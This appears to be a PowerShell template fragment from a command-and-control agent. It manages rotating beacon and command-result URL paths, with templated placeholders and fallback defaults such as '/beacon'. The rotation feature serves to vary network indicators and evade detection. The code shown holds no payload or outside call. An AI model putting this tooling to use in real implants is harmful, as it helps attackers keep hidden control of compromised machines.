# Path rotation configuration
$global:pathRotationEnabled = $true
$global:currentRotationId = {{ROTATION_ID}}
$global:nextRotationTime = {{NEXT_ROTATION_TIME}}
$global:rotationInterval = {{ROTATION_INTERVAL}}

# Store initial paths
$global:initialPaths = @{
    "beacon_path" = "{{BEACON_PATH}}";
    "cmd_result_path" = "{{CMD_RESULT_PATH}}";
}

# Store current paths
$global:currentPaths = $global:initialPaths.Clone()

# Function to handle path rotation updates from server
function Update-PathRotation {
    param(
        [int]$RotationId,
        [int]$NextRotationTime,
        [hashtable]$Paths
    )
    
    $global:currentRotationId = $RotationId
    $global:nextRotationTime = $NextRotationTime
    
    # Update paths if provided
    if ($Paths) {
        $global:currentPaths = @{}
        foreach ($key in $Paths.Keys) {
            $global:currentPaths[$key] = $Paths[$key]
        }
    }
    
    # Log the rotation
    $nextTime = [DateTimeOffset]::FromUnixTimeSeconds($NextRotationTime).DateTime.ToString('yyyy-MM-dd HH:mm:ss')
    Write-Host "Path rotation updated: ID $RotationId, next rotation at $nextTime"
}

# Function to get the current path by type
function Get-CurrentPath {
    param([string]$PathType)
    
    if ($global:currentPaths.ContainsKey($PathType)) {
        return $global:currentPaths[$PathType]
    }
    
    # Fallback to initial paths if not found
    if ($global:initialPaths.ContainsKey($PathType)) {
        return $global:initialPaths[$PathType]
    }
    
    # Default fallback paths
    switch ($PathType) {
        "beacon_path" { return "/beacon" }
        "cmd_result_path" { return "/command_result" }
        default { return "/$PathType" }
    }
}